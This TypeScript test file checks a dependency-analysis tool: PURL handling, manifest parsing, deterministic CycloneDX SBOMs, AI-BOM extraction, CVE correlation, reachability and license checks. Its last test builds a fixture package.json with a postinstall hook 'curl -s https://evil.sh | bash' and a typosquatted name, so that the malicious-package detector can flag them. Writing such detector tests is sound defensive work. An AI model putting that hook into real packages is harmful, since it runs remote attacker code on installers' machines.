/**
 * P17 — Dependency, SBOM/AI-BOM, Vulnerability & Reachability Test Suite
 * Acceptance Gate: PASS only if VULNERABLE_PRESENT and VULNERABILITY_REACHABLE are independent states and SBOM output is deterministic.
 */

import { describe, it, expect } from 'vitest';
import { 
  CompositionEngine,
  CycloneDXGenerator,
  PurlHelper,
  ManifestParserRegistry,
  NpmManifestParser,
  PypiManifestParser,
  GolangManifestParser,
  CargoManifestParser,
  AIBOMExtractor,
  OSVAdapter,
  NVDAdapter,
  VulnerabilityCorrelationEngine,
  ReachabilityEngine,
  LicenseComplianceEngine,
  MaliciousPackageDetector,
  COMPOSITION_FIXTURE_SCENARIOS
} from '../../workers/composition/index.ts';

describe('P17 — Dependency, SBOM/AI-BOM, Vulnerability & Reachability', () => {
  describe('Ecosystem & PURL Normalization', () => {
    it('generates canonical PURLs for diverse package ecosystems', () => {
      const npmPurl = PurlHelper.generate('npm', '@scope/lib', '1.2.3');
      expect(npmPurl).toBe('pkg:npm/scope/lib@1.2.3');

      const pypiPurl = PurlHelper.generate('pypi', 'requests', '2.31.0');
      expect(pypiPurl).toBe('pkg:pypi/requests@2.31.0');

      const goPurl = PurlHelper.generate('golang', 'github.com/gin-gonic/gin', '1.9.1');
      expect(goPurl).toBe('pkg:golang/github.com%2Fgin-gonic/gin@1.9.1');

      const cargoPurl = PurlHelper.generate('cargo', 'tokio', '1.36.0');
      expect(cargoPurl).toBe('pkg:cargo/tokio@1.36.0');
    });

    it('parses valid PURL strings into structured metadata', () => {
      const parsed = PurlHelper.parse('pkg:npm/scope/pkg@2.0.0?arch=x64#dist/index.js');
      expect(parsed).not.toBeNull();
      expect(parsed?.scheme).toBe('pkg');
      expect(parsed?.type).toBe('npm');
      expect(parsed?.namespace).toBe('scope');
      expect(parsed?.name).toBe('pkg');
      expect(parsed?.version).toBe('2.0.0');
      expect(parsed?.qualifiers?.arch).toBe('x64');
      expect(parsed?.subpath).toBe('dist/index.js');
    });
  });

  describe('Manifest & Lockfile Parsers (E29)', () => {
    it('parses npm package.json and package-lock.json with transitive resolution', () => {
      const pkgJson = JSON.stringify({
        name: 'my-app',
        version: '1.0.0',
        dependencies: {
          'lodash': '^4.17.20',
          'express': '4.18.2'
        },
        devDependencies: {
          'typescript': '^5.0.0'
        }
      });

      const lockJson = JSON.stringify({
        name: 'my-app',
        version: '1.0.0',
        lockfileVersion: 3,
        packages: {
          'node_modules/lodash': {
            version: '4.17.20',
            license: 'MIT'
          },
          'node_modules/express': {
            version: '4.18.2',
            license: 'MIT',
            dependencies: {
              'accepts': '1.3.8'
            }
          },
          'node_modules/accepts': {
            version: '1.3.8',
            license: 'MIT'
          }
        }
      });

      const res = NpmManifestParser.parse(pkgJson, lockJson);
      expect(res.rootName).toBe('my-app');
      expect(res.directDependencies.length).toBe(3);
      expect(res.directDependencies.some(d => d.name === 'lodash' && d.scope === 'RUNTIME')).toBe(true);
      expect(res.directDependencies.some(d => d.name === 'typescript' && d.scope === 'DEV')).toBe(true);
      expect(res.transitiveDependencies.some(t => t.name === 'accepts')).toBe(true);
    });

    it('parses Python requirements.txt and pyproject.toml', () => {
      const reqs = `
requests==2.31.0
torch>=2.0.0
# Comment
jinja2~=3.1.2
`;
      const res = PypiManifestParser.parseRequirementsTxt(reqs, 'python-agent', '1.0.0');
      expect(res.directDependencies.length).toBe(3);
      expect(res.directDependencies.some(d => d.name === 'requests')).toBe(true);
      expect(res.directDependencies.some(d => d.name === 'jinja2')).toBe(true);
    });

    it('parses Go go.mod and Cargo.toml', () => {
      const goMod = `
module github.com/org/agent-service

go 1.21

require (
    github.com/gin-gonic/gin v1.9.1
    github.com/google/uuid v1.3.0 // indirect
)
`;
      const goRes = GolangManifestParser.parse(goMod);
      expect(goRes.rootName).toBe('github.com/org/agent-service');
      expect(goRes.directDependencies.some(d => d.name === 'github.com/gin-gonic/gin')).toBe(true);
      expect(goRes.transitiveDependencies.some(t => t.name === 'github.com/google/uuid')).toBe(true);

      const cargoToml = `
[package]
name = "rust-agent"
version = "0.2.0"

[dependencies]
tokio = "1.36.0"
serde = { version = "1.0", features = ["derive"] }
`;
      const cargoRes = CargoManifestParser.parse(cargoToml);
      expect(cargoRes.rootName).toBe("rust-agent");
      expect(cargoRes.directDependencies.length).toBe(2);
    });
  });

  describe('Deterministic CycloneDX SBOM Generation (E30)', () => {
    it('produces byte-identical, deterministic CycloneDX 1.5 JSON on identical inputs', () => {
      const files = new Map<string, string>([
        ['package.json', JSON.stringify({
          name: 'deterministic-demo',
          version: '1.0.0',
          dependencies: {
            'zod': '3.22.4',
            'axios': '1.6.0',
            'lodash': '4.17.21'
          }
        })]
      ]);

      const graph = ManifestParserRegistry.parseAll(files);
      
      const sbom1 = CycloneDXGenerator.generate(graph, '2026-08-24T00:00:00.000Z');
      const json1 = CycloneDXGenerator.toCanonicalJson(sbom1);

      const sbom2 = CycloneDXGenerator.generate(graph, '2026-08-24T00:00:00.000Z');
      const json2 = CycloneDXGenerator.toCanonicalJson(sbom2);

      expect(json1).toBe(json2);
      expect(sbom1.serialNumber).toBe(sbom2.serialNumber);

      const validation = CycloneDXGenerator.validate(sbom1);
      expect(validation.valid).toBe(true);
      expect(validation.errors).toHaveLength(0);
    });
  });

  describe('AI-BOM Extraction (E31)', () => {
    it('extracts foundation models, frameworks, datasets, and prompt templates', () => {
      const files = new Map<string, string>([
        ['src/agent.ts', `
import { ChatOpenAI } from 'langchain/chat_models/openai';
import { load_dataset } from 'datasets';

const system_prompt = "You are a secure code assistant. Analyze vulnerabilities without bias.";
const model = new ChatOpenAI({ modelName: "gpt-4o", temperature: 0.1 });
const backupModel = "claude-3-5-sonnet";
const localWeights = "weights/custom_llama.gguf";
`]
      ]);

      const aibom = AIBOMExtractor.extract(files);
      expect(aibom.models.some(m => m.name === 'gpt-4o' && m.provider === 'openai')).toBe(true);
      expect(aibom.models.some(m => m.name === 'claude-3-5-sonnet' && m.provider === 'anthropic')).toBe(true);
      expect(aibom.frameworks.some(f => f.name === 'langchain')).toBe(true);
      expect(aibom.prompt_templates.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('Advisories & Vulnerability Correlation (E32)', () => {
    it('matches vulnerable packages and semver ranges from catalog', async () => {
      const files = new Map<string, string>([
        ['package.json', JSON.stringify({
          name: 'vuln-test',
          version: '1.0.0',
          dependencies: {
            'lodash': '4.17.20', // Vulnerable to CVE-2020-28500 (<4.17.21)
            'axios': '1.6.0'      // Fixed version for CVE-2023-34462
          }
        })]
      ]);

      const graph = ManifestParserRegistry.parseAll(files);
      const vulnMap = await VulnerabilityCorrelationEngine.correlate(graph);

      const lodashPurl = graph.all_components.find(c => c.name === 'lodash')!.purl;
      const axiosPurl = graph.all_components.find(c => c.name === 'axios')!.purl;

      expect(vulnMap.has(lodashPurl)).toBe(true);
      expect(vulnMap.get(lodashPurl)!.some(v => v.vuln_id === 'CVE-2020-28500')).toBe(true);

      // axios 1.6.0 is fixed, should not be marked vulnerable
      expect(vulnMap.has(axiosPurl)).toBe(false);
    });
  });

  describe('Reachability & Exploitability Engine (E33)', () => {
    it('enforces strict independence of VULNERABLE_PRESENT vs VULNERABILITY_REACHABLE', async () => {
      // Scenario 1: lodash is installed and zipObjectDeep is called -> REACHABLE
      // axios is installed and imported, but maxContentLength leak is not invoked -> PRESENT_UNREACHED
      const scenario1 = COMPOSITION_FIXTURE_SCENARIOS[0];
      const fileMap1 = new Map<string, string>(Object.entries(scenario1.files));

      const result1 = await CompositionEngine.run({
        artifactId: 'art-reachability-test-1',
        files: fileMap1,
      });

      const lodashTrace = result1.reachability_results.find(r => r.package_name === 'lodash');
      const axiosTrace = result1.reachability_results.find(r => r.package_name === 'axios');

      expect(lodashTrace).toBeDefined();
      expect(lodashTrace?.status).toBe('VULNERABILITY_REACHABLE');
      expect(lodashTrace?.reachability_path.length).toBeGreaterThan(0);

      expect(axiosTrace).toBeDefined();
      expect(axiosTrace?.status).toBe('PRESENT_UNREACHED');
      expect(axiosTrace?.status).not.toBe('VULNERABILITY_REACHABLE');
    });

    it('does not mark vulnerability reachable if package is merely installed in manifest (Unreferenced)', async () => {
      const scenario3 = COMPOSITION_FIXTURE_SCENARIOS[2];
      const fileMap3 = new Map<string, string>(Object.entries(scenario3.files));

      const result3 = await CompositionEngine.run({
        artifactId: 'art-reachability-test-3',
        files: fileMap3,
      });

      expect(result3.reachability_results.length).toBe(1);
      const trace = result3.reachability_results[0];
      expect(trace.package_name).toBe('lodash');
      expect(trace.status).toBe('VULNERABLE_PRESENT');
      expect(trace.status).not.toBe('VULNERABILITY_REACHABLE');
      expect(trace.imported_in_files.length).toBe(0);
    });

    it('supports dynamic telemetry confirmation hook', async () => {
      const fileMap = new Map<string, string>([
        ['package.json', JSON.stringify({
          name: 'telemetry-test',
          version: '1.0.0',
          dependencies: { 'lodash': '4.17.15' }
        })],
        ['src/index.ts', 'export const x = 1;']
      ]);

      const resultWithRuntime = await CompositionEngine.run({
        artifactId: 'art-telemetry-test',
        files: fileMap,
        runtimeEvents: [
          { event_type: 'CALL_STACK_EXECUTION', payload: { package: 'lodash', symbol_called: 'zipObjectDeep' } }
        ]
      });

      const trace = resultWithRuntime.reachability_results[0];
      expect(trace.status).toBe('DYNAMICALLY_CONFIRMED_REACHABLE');
      expect(trace.runtime_confirmed).toBe(true);
      expect(trace.confidence).toBe(1.0);
    });
  });

  describe('License & Malicious Package Detection (E34 & E35)', () => {
    it('classifies permissive and strong copyleft licenses', () => {
      const components = [
        { ecosystem: 'npm' as const, name: 'react', version: '18.2.0', purl: 'pkg:npm/react@18.2.0', is_direct: true, depth: 1, license: 'MIT' },
        { ecosystem: 'npm' as const, name: 'gpl-tool', version: '1.0.0', purl: 'pkg:npm/gpl-tool@1.0.0', is_direct: true, depth: 1, license: 'GPL-3.0' }
      ];

      const compliance = LicenseComplianceEngine.evaluate(components);
      expect(compliance.find(c => c.package_name === 'react')?.classification).toBe('PERMISSIVE');
      expect(compliance.find(c => c.package_name === 'gpl-tool')?.classification).toBe('STRONG_COPYLEFT');
    });

    it('detects typo-squatting and suspicious remote lifecycle scripts', () => {
      const components = [
        { ecosystem: 'npm' as const, name: 'lodsh', version: '1.0.0', purl: 'pkg:npm/lodsh@1.0.0', is_direct: true, depth: 1 }
      ];

      const manifests = new Map<string, string>([
        ['package.json', JSON.stringify({
          name: 'malicious-demo',
          version: '1.0.0',
          scripts: {
            'postinstall': 'curl -s https://evil.sh | bash'
          }
        })]
      ]);

      const risks = MaliciousPackageDetector.scan(components, manifests);
      expect(risks.some(r => r.risk_type === 'TYPOSQUAT')).toBe(true);
      expect(risks.some(r => r.risk_type === 'SUSPICIOUS_LIFECYCLE_SCRIPT')).toBe(true);
    });
  });
});
